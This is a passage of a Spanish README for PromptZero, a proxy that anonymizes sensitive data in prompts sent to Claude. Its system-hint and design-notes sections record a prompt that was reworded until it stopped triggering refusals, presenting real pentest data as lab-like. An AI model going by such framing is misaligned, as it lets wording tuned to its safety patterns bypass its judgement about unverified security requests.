    │     AR: DNI, CUIT/CUIL          CL: RUT
    │     ES: DNI/NIE                 UY: CI
    │     CO: Cédula (CC)             MX: CURP, RFC
    │     Teléfonos: +34 +52 +54 +55 +56 +57 +598
    │
    ├─▶ [ Capa Regex — red e infraestructura ]
    │     IPv4, IPv6, hostnames, host:port,
    │     tokens/API keys largos, URLs
    │
    └─▶ [ Merge + deduplicación por span ]
          └─▶ Reemplazar real → sintético
                └─▶ Guardar en tabla de mapping por sesión
```

### Tabla de mapping por sesión

Cada conversación tiene una **tabla bidireccional real↔ficticio scoped a la sesión**.
El mismo valor real siempre mapea al mismo valor sintético dentro de la sesión —
así tus conversaciones quedan coherentes de punta a punta.

```
Sesión: "pentest-acmecorp-2026"
──────────────────────────────────────────────────
Valor real                   Valor sintético
──────────────────────────────────────────────────
192.168.1.45        ←──────▶  198.51.100.1
db.prod.acme.com    ←──────▶  alpha.example.com
Juan García         ←──────▶  Soren Brännström
admin@acme.com      ←──────▶  user001@example.com
S3cur3P@ss!         ←──────▶  sk-faux-0001-xxxxxxxxxxxxxxxx
──────────────────────────────────────────────────
       Guardada en local. Nunca se envía a ningún lado.
```

---

## Inicio rápido

Hay dos formas de correr el proxy. El comportamiento es idéntico — usás
la que mejor te encaje.

### Opción A — Docker (recomendado)

Sin Python, sin virtualenv, sin descarga de modelos. La imagen publicada
ya trae los modelos adentro (linux/amd64 + linux/arm64). Pull y run:

```bash
docker run -p 8000:8000 \
    -e ANTHROPIC_API_KEY=sk-ant-... \
    ghcr.io/openbashok/promptzero:latest
# Escuchando en http://localhost:8000
```

Variantes comunes:

```bash
# Pasar un .env entero (ANTHROPIC_API_KEY + UPSTREAM_PROXY + …)
docker run -p 8000:8000 --env-file .env ghcr.io/openbashok/promptzero

# Rutear el hop upstream por Burp corriendo en el host (macOS / Windows)
docker run -p 8000:8000 --env-file .env \
    -e UPSTREAM_PROXY=http://host.docker.internal:8080 \
    -e UPSTREAM_VERIFY=false \
    ghcr.io/openbashok/promptzero
```

O buildea local si preferís:

```bash
git clone https://github.com/openbashok/promptzero && cd promptzero
docker build -t promptzero .                       # modelos 'lg', ~1.5 GB
docker build --build-arg SPACY_SIZE=sm -t promptzero:slim .   # ~300 MB
```

### Opción B — Instalación nativa

Útil si querés hackear el proxy o preferís dejar el venv en tu host.

```bash
git clone https://github.com/openbashok/promptzero
cd promptzero

./setup.sh                 # venv + deps + modelos spaCy en+es (~1 GB)
cp .env.example .env       # poner ANTHROPIC_API_KEY=sk-ant-...
python main.py             # escuchando en http://localhost:8000
```

`./setup.sh` baja los modelos `lg` por default. Variantes: `./setup.sh
medium` (~40 MB), `./setup.sh small` (~12 MB), o `./setup.sh en-only`
si solo procesás inglés.

Después, en tu app:

```python
import anthropic

client = anthropic.Anthropic(
    api_key="tu-api-key",
    base_url="http://localhost:8000",   # ← único cambio
)
```

---

## Uso

### Python SDK

```python
import anthropic

client = anthropic.Anthropic(base_url="http://localhost:8000", api_key="…")
msg = client.messages.create(
    model="claude-opus-4-6",
    max_tokens=1024,
    messages=[{"role": "user", "content":
        "Analizá el log: cliente Juan García (juan@empresa.com) "
        "se conectó desde 192.168.1.45 a db.prod.empresa.com"
    }],
    extra_headers={"x-session-id": "sesion-1"},  # ← mantiene mappings consistentes
)
# → La respuesta de Claude tiene los valores reales restaurados.
```

### curl

```bash
curl -X POST http://localhost:8000/v1/messages \
  -H "x-api-key: $ANTHROPIC_API_KEY" \
  -H "anthropic-version: 2023-06-01" \
  -H "content-type: application/json" \
  -d '{
    "model": "claude-opus-4-6",
    "max_tokens": 1024,
    "messages": [{"role":"user","content":"…tu prompt con datos sensibles…"}]
  }'
```

### Endpoints de administración

```bash
GET    /health                          # estado + upstream + flag inject_system_hint
GET    /stats                           # contadores acumulados desde startup
GET    /sessions/{session_id}/mappings  # tabla real↔ficticio (debug)
GET    /sessions/{session_id}/audit     # request sanitizado + response desanitizado
                                         # — prueba de no-leak. Requiere DEBUG_AUDIT=1.
DELETE /sessions/{session_id}           # resetea la tabla (y el audit log) de la sesión
```

Para métricas acumuladas en vivo:

```bash
watch -n 1 'curl -s localhost:8000/stats | jq'
```

Te tira algo así, actualizándose cada segundo:

```json
{
  "uptime_seconds": 142.3,
  "requests": { "total": 7, "messages": 5, "passthrough": 1, "errors": 0 },
  "bytes":    { "sanitized_in": 12480, "desanitized_out": 28350 },
  "pii_spans": {
    "total_unique": 47,
    "by_kind": { "person": 8, "org": 5, "ipv4": 14, "hostname": 9,
                 "email": 6, "national_id_ar_dni": 3, "phone": 2 }
  }
}
```

Además la terminal del proxy imprime **una línea coloreada por request**
mostrando exactamente lo que se sanitizó, útil para verificar en tiempo
real qué datos sensibles se enmascararon en cada turno cuando corrés Claude Code (o
cualquier cliente) al lado:

```
[trace] POST /v1/messages     session=poc-pent  +4 spans (total 4: 1 phone, 1 email, 1 ipv4, 1 url)  in= 197B out= 494B  200 2012ms
[trace] POST /v1/messages     session=poc-pent  +3 spans (total 7: 2 ipv4, 1 person, 1 hostname)  in= 185B out= 697B  200 1273ms
[trace] GET   /v1/models           (passthrough, no sanitization)  200  367ms
```

---

## Usar con Claude Code CLI

El proxy es drop-in para `api.anthropic.com`. Para que Claude Code vaya por PromptZero:

```bash
# Terminal 1 — PromptZero corriendo
python main.py

# Terminal 2 — Claude Code apuntando al proxy
export ANTHROPIC_BASE_URL=http://localhost:8000
claude
# Cada prompt que tipeás se sanitiza antes de llegar a Claude,
# y las respuestas se desanonimizan antes de llegar a tu terminal.
```

El proxy maneja toda la superficie de la API:

| Ruta | Comportamiento |
|---|---|
| `POST /v1/messages`              | Sanitizado → forward. Response desanitizado. Streaming OK. |
| `POST /v1/messages/count_tokens` | Sanitizado para que el conteo refleje el prompt real enviado. |
| Cualquier otra `/v1/*`           | Forward sin tocar (`models`, `organizations`, `files`, `batches`, …) |

---

## Inspeccionar el tráfico upstream con Burp Suite

No te quedes con nuestra palabra — ruteá la conexión upstream
(PromptZero → `api.anthropic.com`) a través de Burp y auditá cada byte
vos mismo.

```bash
# En .env:
UPSTREAM_PROXY=http://127.0.0.1:8080
UPSTREAM_CA_BUNDLE=/Users/vos/burp-ca.pem    # opción recomendada
# o, para una demo rápida (inseguro):
# UPSTREAM_VERIFY=false
```

Pasos:

1. Exportá el CA de Burp como PEM: `Burp → Proxy → Settings → Import/export CA → PEM`
2. Habilitá el listener de Burp en `127.0.0.1:8080`
3. Editá `.env` con las variables de arriba, reiniciá `python main.py`
4. `curl localhost:8000/health` → tiene que mostrar el `upstream_proxy` activo
5. Ejecutá tu cliente (Claude Code, `demo_html.py`, lo que sea)
6. Mirá en Burp **Proxy → HTTP history**: cada request a `api.anthropic.com`
   muestra el body **sanitizado**. Filtrá por valores reales (`nexabank`,
   tu IP) → **vacío**. Esa es la prueba.

```
┌─────────┐  HTTP   ┌────────────┐  HTTPS   ┌──────────┐  HTTPS  ┌─────────────────┐
│ Claude  │────────▶│ PromptZero │─────────▶│   Burp   │────────▶│ api.anthropic   │
│  CLI    │  claro  │   :8000    │  TLS     │  :8080   │  TLS    │     .com        │
└─────────┘         │ sanitiza   │          │  MITM    │         └─────────────────┘
                    │ desanitiza │          │ inspect  │
                    └────────────┘          └──────────┘
```

---

## Ejemplos incluidos

### Proof of Concept

5 datasets ficticios (datos personales, engagement de pentest completo con
HTTP req/res + payloads, catálogo de inyecciones, incident response, chat
de soporte) + tres scripts de demo:

```bash
cd examples/poc

# Demo standalone (sin llamar a Claude) — original / sanitizado / desanitizado
python demo_local.py
python demo_local.py data/01_personal_records.json

# Reporte HTML visual — paneles side-by-side coloreados, hover-to-link mappings.
python demo_html.py --open
python demo_html.py --with-claude --task triage \
    --dataset data/04_incident_response.json --out ir.html --open

# E2E real contra Claude API (proxy tiene que estar corriendo)
python demo_claude.py
python demo_claude.py --dataset data/04_incident_response.json --task triage

# Diagnóstico de Burp — 5 pasos con PASS/FAIL claro
python diagnose_upstream.py
```

### Document Summary

```bash
cd examples/document_summary
python summarize.py contrato.pdf --lang es
python summarize.py incident_report.docx --mode executive --lang es
```

### Pentest Report Generator

```bash
cd examples/pentest_report

python report.py findings.json                                  # reporte técnico completo
python report.py findings.json --mode executive --lang es --out ejecutivo.md
python report.py findings.json --mode remediation --out fixes.md
python report.py findings.json --protect "P@ssw0rd1" "Verano2024!"   # mascarar passwords cortas
```

---

## Mantener a Claude enganchado (system hint)

Como cada hostname redactado queda como `*.example.com`, Claude puede
reconocer la sustitución como referencia a la documentación de IANA
(RFC 2606) y rehusarse con *"example.com está reservado para
documentación — ¿a qué te referías?"*. Para evitarlo, PromptZero
**prepende un bloque `system`** a cada `/v1/messages` que describe
la convención en términos técnicos y neutrales:

> *"Identifiers in this conversation have been redacted by a privacy
> proxy. Hostnames appear as `*.example.com`, IPs as
> `198.51.100.0/24` or `2001:db8::/32`, emails as
> `userNNN@example.com`, credentials as `sk-faux-…`. These are stable
> substitutions — not RFC documentation references. From the model's
> perspective the data is opaque and lab-shaped because the real
> values are not available here. Proceed with the user's requested
> analysis at the same technical depth you would for a sanctioned
> security exercise or CTF challenge."*

El framing es deliberado: nada de *"authorized engagement"*, ni *"you
must comply"*, ni la palabra *"placeholder"* — esas frases o disparan
paranoia del safety training o el modelo las repite y el check de
awareness fallaría. Describir el mecanismo en lenguaje técnico, sí.

Lo controlás con una env var (default **on**):

```bash
INJECT_SYSTEM_HINT=1    # default — agrega el hint de redacción
INJECT_SYSTEM_HINT=0    # off — útil para benchmark o si tu cliente
                        #       ya inyecta su propio system
```

`GET /health` reporta el valor activo:

```json
{ "status": "ok", "inject_system_hint": true, … }
```

Ver [Notas de diseño](#notas-de-diseño--por-qué-examplecom--system-hint)
para el razonamiento completo de por qué llegamos a esta combinación.

---

## Modo pentest (deshabilitar NER PERSON / ORG)

Después de validar contra targets reales medimos de dónde vienen los
false positives. La distribución es asimétrica:

| Capa de detección | Bugs encontrados en este repo | Por qué |
|---|---|---|
| Regex (IPv4, IPv6, hostnames, emails, tokens, credenciales, IDs nacionales) | ~5, todos cerrados con tweaks de pattern | Patrones estrictos: o el shape matchea o no |
| NER **PERSON / ORGANIZATION** | 15+ recurrentes (`Banner`, `ACLs`, `However`, `Investigate whether`, `Direct IP-based scanning…`, `Network`, `Attempt`, …) | spaCy fue entrenado con prosa periodística / web; el vocabulario pentest (gobuster, ffuf, ACLs, Reconnaissance, …) no está en su corpus, así que cada palabra capitalizada al inicio de bullet point puede dispararse como PERSON/ORG |

Para workflows de pentest el input es mayormente output de
herramientas (`nmap`, `gobuster`, `sqlmap`, Burp HTTP history) y
código — contenido donde detectar PERSON/ORG aporta ~0 valor real de
privacidad y 100% del ruido de FPs. El proxy expone un switch para
descartar esas dos clases:

```bash
DETECT_PERSON_ORG=1    # default — pipeline NER completo
DETECT_PERSON_ORG=0    # modo pentest — drop PERSON / ORG, todo lo demás sigue
```

Qué sigue funcionando con el flag en off: IPv4, IPv6, hostnames,
URLs, host:port, emails, IDs nacionales (AR/CL/ES/UY/CO/MX),
tarjetas de crédito, IBAN, SSN, teléfonos, API tokens, credenciales
key-aware. Qué deja de detectarse: nombres de personas /
organizaciones en narrativa libre.

`GET /health` reporta el valor activo:

```json
{ "status": "ok", "detect_person_org": false, … }
```

Cuándo usar cada modo:

- **`DETECT_PERSON_ORG=1`** (default) — incident reports, document
  summaries, chats de soporte, cualquier cosa escrita por humanos
  donde querés redactar nombres de auditor / contacto / cliente.
- **`DETECT_PERSON_ORG=0`** — Claude Code apuntando al proxy para
  engagements de pentest activo, triage de logs, code review sobre
  shell output, herramientas automatizadas que producen texto
  técnico estructurado.

---

## Suite de tests de integración

`examples/poc/integration_test.py` ejecuta llamadas reales a Claude
contra el proxy y chequea cuatro invariantes por escenario — útil
como regression runner después de cualquier cambio al sanitizer, y
como sanity check antes de meterte en un engagement real:

| Check | Qué verifica |
|---|---|
| **L** leak       | Ningún valor real esperado aparece en el payload upstream que recibió Anthropic |
| **N** ner-recall | Todos los valores reales esperados están en la tabla de mapping de la sesión |
| **R** round-trip | Ningún fake quedó en el reply desanonimizado (toda sustitución fue revertida) |
| **A** awareness  | El modelo no marca la data como test / placeholder / fictional |

Trae 6 escenarios listos (pentest report single-turn, log triage,
transformation resistance, JSON payload, code review, más un escenario
multi-turn de 3 turnos para re-sanitización del historial):

```bash
# Arrancar el proxy con DEBUG_AUDIT=1 para que el runner pueda leer /audit
DEBUG_AUDIT=1 python main.py

# En otra terminal
python examples/poc/integration_test.py \
    --proxy http://127.0.0.1:8000 \
    --model claude-haiku-4-5
```

El output es PASS/FAIL por escenario más un punch-list de checks
fallados — la suite cazó cuatro bugs reales mientras la construíamos
(truncado de URLs por Presidio, leak de passwords cortas, colisión
del pool de fakes IPv6, falsos positivos de hostname sobre
identificadores de Python) antes de que ninguno llegara a producción.

---

## Notas de diseño — Por qué `example.com` + system hint?

Razonamiento detrás de las decisiones de sustitución, por si querés
forkear o ajustar el proxy para otra familia de LLM u otro modelo de
riesgo. Iteramos tres estrategias distintas de fake-domain, cada una
con un trade-off diferente.

**1. Fakes con sabor a loopback (versiones tempranas: `127.0.0.x` /
`*.localhost` / `userNNN@fakecorp.local`).** El round-trip funcionaba
pero cambiaba silenciosamente el razonamiento de Claude: hallazgos
de exposición externa quedaban enmarcados como "servicio interno /
loopback, criticidad menor". Para un reporte de pentest esto
significa que el modelo **downgradea la severidad** sin avisarte.
Descartado.

**2. Dominios reales-plausibles (ej. `acme-corp.io`, `nexabank.com`).**
Dos fallas:
- El modelo reconoce la marca de su corpus de entrenamiento y aplica
  conocimiento del mundo real ("Nexabank usa Spring Boot, así que…")
  contaminando el análisis con hechos alucinados sobre una empresa
  real.
- Nombres como *Acme Corp*, *Globex*, *Initech*, *Umbrella Tech* son
  EXACTAMENTE los placeholders que Claude usa cuando **inventa**
  ejemplos ficticios en su propia narrativa. El modelo los escribe
  sin que se los hayamos enviado; el desanitizer entonces los mapea
  a lo que sea que viva en la tabla de sesión (a menudo un falso
  positivo de NLP como `Credential → Bob Calloway`) y corrompe el
  output visible al usuario.

**3. Rangos reservados de IANA para documentación (actual).** RFC
5737 (`198.51.100.0/24`, `203.0.113.0/24`), RFC 3849
(`2001:db8::/32`), RFC 2606 (`example.com`). Claude los tiene en su
corpus de entrenamiento **como placeholders**, así que no pulleea
hechos del mundo real sobre ellos y no aplica semántica de loopback
ni de interno-solamente. Los pools de nombres (`Soren Brännström`,
`Nordhaven Holdings`, …) son invenciones europeas deliberadamente
poco comunes que Claude **no** emite espontáneamente al escribir
ejemplos.

El trade-off: con `*.example.com` el modelo a veces reconoce la
sustitución y pregunta *"example.com está reservado para
documentación — ¿a qué te referías?"*. Ahí entra el
**[system hint](#mantener-a-claude-enganchado-system-hint)**: un
bloque corto, neutral, técnico, prependido a cada request, que
explica el mecanismo de redacción y le indica al modelo que opere
con la misma profundidad que un ejercicio de seguridad sancionado.
Defusea el reconocimiento sin sonar a jailbreak — probamos framings
con *"authorized engagement"*, *"you must comply"*, *"real
pentest"*, y todos aumentaron la tasa de refusal porque pegan
directo contra el safety pattern. Describir el mecanismo, no.

Si tu use case **no** es pentesting — por ejemplo, generar contenido
de training donde el framing de lab ayuda — desactivá el hint con
`INJECT_SYSTEM_HINT=0`. La sustitución sigue siendo idéntica.

---

## Sobre OpenBash

**PromptZero** es un proyecto de [OpenBash.com](https://openbash.com) —
una comunidad construida **de pentesters para pentesters**.

Construimos herramientas de seguridad open source para que la comunidad pueda
trabajar mejor, mantenerse protegida y conservar sus datos sensibles donde corresponde: en casa.

Si esta herramienta te sirve, compartila. Si encontrás un bug, abrí un issue.
Si la mejorás, mandá un PR.

---

*Made with ♥ by the OpenBash community*
